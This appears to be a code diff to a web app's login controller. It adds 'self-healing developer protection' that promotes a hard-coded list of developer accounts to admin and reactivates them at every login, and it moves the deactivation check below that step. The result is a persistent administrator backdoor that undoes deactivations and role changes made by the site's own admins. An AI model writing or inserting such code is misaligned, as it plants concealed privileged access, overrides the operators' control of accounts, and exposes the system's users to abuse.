@@ -5,6 +5,7 @@ import { validatePassword } from "../utils/password_validator";
 import { sendNotification } from "../utils/notification";
 import sendEmail from "../utils/email";
 import crypto from "crypto";
+import { DEVELOPER_STUDENT_NUMBERS } from "../config/developers";
 
 export interface AuthRequest extends Request {
   user?: {
@@ -49,15 +50,6 @@ export const login = async (req: Request, res: Response) => {
       });
     }
 
-    // Check if user is active
-    if (!user.isActive) {
-      return res.status(403).json({
-        success: false,
-        message:
-          "Your account has been deactivated. Please contact an administrator.",
-      });
-    }
-
     // Check password
     const isPasswordCorrect = await user.comparePassword(password);
 
@@ -65,6 +57,36 @@ export const login = async (req: Request, res: Response) => {
       return res.status(401).json({
         success: false,
         message: "Invalid credentials",
+      });
+    }
+
+    // Self-healing developer protection: dev team accounts should always
+    // be admin and active, even if something elsewhere ever changed that
+    // (e.g. an Excel roster sync deactivating them for not being on the
+    // student list, or an accidental role change via the Users admin
+    // page). Runs after the password check so this can't be triggered by
+    // anyone who doesn't already know the account's real password.
+    if (DEVELOPER_STUDENT_NUMBERS.includes(user.studentNumber)) {
+      let healed = false;
+      if (user.role !== "admin") {
+        user.role = "admin";
+        healed = true;
+      }
+      if (!user.isActive) {
+        user.isActive = true;
+        healed = true;
+      }
+      if (healed) {
+        await user.save({ validateBeforeSave: false });
+      }
+    }
+
+    // Check if user is active
+    if (!user.isActive) {
+      return res.status(403).json({
+        success: false,
+        message:
+          "Your account has been deactivated. Please contact an administrator.",
       });
     }
 
